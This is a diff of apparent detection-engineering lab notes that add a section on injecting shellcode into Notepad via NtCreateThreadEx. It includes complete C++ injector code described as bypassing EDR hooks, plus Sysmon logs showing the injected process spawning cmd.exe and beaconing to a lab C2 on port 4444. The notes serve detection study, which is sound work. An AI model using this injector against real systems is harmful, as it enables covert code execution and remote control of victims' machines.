@@ -84,7 +84,7 @@ DWORD GetPID(const wchar_t* procName) {
 }
 ```
 
-### Technique 1. Classic CreateRemoteThread
+## Technique 1. Classic CreateRemoteThread
 Opens a handle to a running process, writes shellcode into its memory space,
 then creates a new thread inside that process to execute it. All through
 documented Win32 API calls in kernel32.dll. Most well-known injection
@@ -156,7 +156,7 @@ int main() {
 }
 ```
 
-#### SYSMON data
+### SYSMON Data
 1. "Process accessed:
 RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
 UtcTime: 2026-05-12 11:15:16.217
@@ -248,16 +248,17 @@ DestinationHostname: -
 DestinationPort: 4444
 DestinationPortName: -"
 
-#### SYSMON analysis
-Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of RW codes.
+### SYSMON analysis
+Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of RW codes. Also csrss.exe opens handles to every process that starts or exits on the system so could need to exclude for less noise.
 
-| Attack Step                       | Sysmon EID | Rule Triggered          |
-|-----------------------------------|------------|-------------------------|
-| Injector opens handle to target   | EID 10     | ProcessInjectionDelux   |
-| Remote thread created             | EID 8      | T1055 Process Injection |
-| Shellcode spawns cmd.exe          | EID 1      | T1059.003 Cmd Shell     |
-| Shellcode opens handle to cmd     | EID 10     | ProcessInjectionDelux   |
-| C2 callback                       | EID 3      | T1571 Non-Standard Port |
+| Step | Action                                | Sysmon EID | Rule Triggered          |
+|------|---------------------------------------|------------|-------------------------|
+| 1    | Injector opens handle to Notepad      | EID 10     | ProcessInjectionDelux   |
+| 2    | Shellcode written to remote memory    | —          | —                       |
+| 3    | CreateRemoteThread creates thread     | EID 8      | T1055 Process Injection |
+| 4    | Shellcode opens handle to cmd.exe     | EID 10     | ProcessInjectionDelux   |
+| 5    | Notepad spawns cmd.exe                | EID 1      | T1059.003 Cmd Shell     |
+| 6    | Notepad beacons to C2                 | EID 3      | T1571 Non-Standard Port |
 
 ### Key Indicators
 - **EID 8** `StartModule: -` — thread starts from anonymous memory, not a
@@ -266,7 +267,219 @@ Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to 
   Caught by ProcessInjectionDelux rule.
 - **EID 10** `CallTrace: UNKNOWN(address)` — shellcode calling Win32 APIs
   from anonymous memory. Legitimate code always has a named module in trace.
-- **EID 1** Notepad.exe → cmd.exe — anomalous parent-child relationship.
-  Notepad should never spawn a shell.
-- **EID 3** Notepad.exe → 192.168.32.49:4444 — legitimate notepad process
-  making outbound C2 connection.
+
+
+## 2. Direct Native API
+Calls NtCreateThreadEx directly from ntdll.dll instead of going through CreateRemoteThread in kernel32.dll. Internally, CreateRemoteThread is just a wrapper that eventually calls NtCreateThreadEx so the kernel sees the same event. EDRs typically place hooks at the top of each function in kernel32.dll and ntdll.dll. By skipping kernel32.dll entirely you bypass any hook placed on CreateRemoteThread. Sysmon sits in the kernel and should catch the threat creation event regardless.
+| API Call            | Layer      | Sysmon Event |
+|---------------------|------------|--------------|
+| OpenProcess()       | Win32      | EID 10       |
+| VirtualAllocEx()    | Win32      | —            |
+| WriteProcessMemory()| Win32      | —            |
+| NtCreateThreadEx()  | Native API | EID 8        |
+
+```
+// t2_ntcreatethreadex.cpp
+#include "common.h"
+
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
+    PHANDLE             hThread,
+    ACCESS_MASK         DesiredAccess,
+    LPVOID              ObjectAttributes,
+    HANDLE              ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID              lpParameter,
+    ULONG               Flags,
+    SIZE_T              StackZeroBits,
+    SIZE_T              SizeOfStackCommit,
+    SIZE_T              SizeOfStackReserve,
+    LPVOID              lpBytesBuffer
+);
+
+int main() {
+    DWORD pid = GetPID(L"notepad.exe");
+    if (!pid) {
+        wprintf(L"[-] notepad.exe not found\n");
+        return 1;
+    }
+    wprintf(L"[*] Target PID: %lu\n", pid);
+
+    // EID 10 fires here
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) {
+        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
+        return 1;
+    }
+    wprintf(L"[+] Handle acquired\n");
+
+    LPVOID remoteMem = VirtualAllocEx(
+        hProc, NULL, shellcode_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    if (!remoteMem) {
+        wprintf(L"[-] VirtualAllocEx failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
+        wprintf(L"[-] WriteProcessMemory failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Shellcode written: %zu bytes\n", written);
+
+    // Resolve NtCreateThreadEx directly from ntdll
+    // bypassing kernel32.dll entirely
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
+        ntdll, "NtCreateThreadEx"
+    );
+    if (!NtCreateThreadEx) {
+        wprintf(L"[-] Failed to resolve NtCreateThreadEx\n");
+        return 1;
+    }
+    wprintf(L"[+] NtCreateThreadEx resolved at: 0x%p\n", NtCreateThreadEx);
+
+    // EID 8 fires here — kernel sees same thread creation event as T1
+    HANDLE hThread = NULL;
+    NTSTATUS status = NtCreateThreadEx(
+        &hThread,
+        GENERIC_EXECUTE,
+        NULL,
+        hProc,
+        (LPTHREAD_START_ROUTINE)remoteMem,
+        NULL,
+        0,          // not suspended
+        0, 0, 0,
+        NULL
+    );
+
+    wprintf(L"[+] NtCreateThreadEx status: 0x%08X\n", status);
+    if (!hThread) {
+        wprintf(L"[-] Thread creation failed\n");
+        return 1;
+    }
+    wprintf(L"[+] Remote thread created\n");
+    wprintf(L"[*] Watch Elastic for EID 8 and EID 10\n");
+
+
+    WaitForSingleObject(hThread, 5000);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}
+```
+
+### SYSMON Data
+1. "Process accessed:
+RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
+UtcTime: 2026-05-12 14:00:07.843
+SourceProcessGUID: {ED9BFE1B-3266-6A03-B907-000000000A00}
+SourceProcessId: 3628
+SourceThreadId: 10800
+SourceImage: C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe
+TargetProcessGUID: {ED9BFE1B-3204-6A03-AD07-000000000A00}
+TargetProcessId: 6512
+TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+GrantedAccess: 0x1fffff
+CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+161fc4|C:\WINDOWS\System32\KERNELBASE.dll+42e76|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+15d8|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+10d9|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
+SourceUser: WIN11\jens
+TargetUser: WIN11\jens"
+
+2. "CreateRemoteThread detected:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2026-05-12 14:00:07.859
+SourceProcessGuid: {ED9BFE1B-3266-6A03-B907-000000000A00}
+SourceProcessId: 3628
+SourceImage: C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe
+TargetProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
+TargetProcessId: 6512
+TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+NewThreadId: 6484
+StartAddress: 0x000001A1101C0000
+StartModule: -
+StartFunction: -
+SourceUser: WIN11\jens
+TargetUser: WIN11\jens"
+
+3. "Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2026-05-12 14:00:08.433
+ProcessGuid: {ED9BFE1B-3268-6A03-BD07-000000000A00}
+ProcessId: 12136
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: cmd
+CurrentDirectory: C:\Users\jens\
+User: WIN11\jens
+LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
+LogonId: 0xb3f74
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
+ParentProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
+ParentProcessId: 6512
+ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" 
+ParentUser: WIN11\jens"
+
+4. "Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2026-05-12 14:00:08.573
+SourceProcessGUID: {ED9BFE1B-3204-6A03-AD07-000000000A00}
+SourceProcessId: 6512
+SourceThreadId: 6484
+SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+TargetProcessGUID: {ED9BFE1B-3268-6A03-BD07-000000000A00}
+TargetProcessId: 12136
+TargetImage: C:\WINDOWS\system32\cmd.exe
+GrantedAccess: 0x1fffff
+CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000001A1101C01BC)
+SourceUser: WIN11\jens
+TargetUser: WIN11\jens"
+
+5. "Network connection detected:
+RuleName: technique_id=T1571,technique_name=Non-Standard Port
+UtcTime: 2026-05-12 14:00:10.572
+ProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
+ProcessId: 6512
+Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
+User: WIN11\jens
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.32.39
+SourceHostname: -
+SourcePort: 49278
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 192.168.32.49
+DestinationHostname: -
+DestinationPort: 4444
+DestinationPortName: -"
+
+
+### SYSMON analysis
+| Step | Action                               | Sysmon EID | Rule Triggered          |
+|------|--------------------------------------|------------|-------------------------|
+| 1    | Injector opens handle to Notepad     | EID 10     | ProcessInjectionDelux   |
+| 2    | Shellcode written to remote memory   | —          | —                       |
+| 3    | NtCreateThreadEx creates thread      | EID 8      | T1055 Process Injection |
+| 4    | Shellcode opens handle to cmd.exe    | EID 10     | ProcessInjectionDelux   |
+| 5    | Notepad spawns cmd.exe               | EID 1      | T1059.003 Cmd Shell     |
+| 6    | Notepad beacons to C2                | EID 3      | T1571 Non-Standard Port |
+
+### Key Indicators
+- **EID 10** `CallTrace: t2_ntcreatethreadex.exe+15d8` — injector binary
+  visible in call trace. Clean chain through ntdll and KERNELBASE into
+  the injector with no UNKNOWN modules at this stage.
+- **EID 8** `StartModule: -` — thread starts from anonymous memory.
+- **EID 10** `SourceThreadId: 6484` matches `NewThreadId: 6484` from
+  EID 8 — the injected thread is the one making subsequent API calls.
+  Direct forensic link between thread creation and post-injection activity.
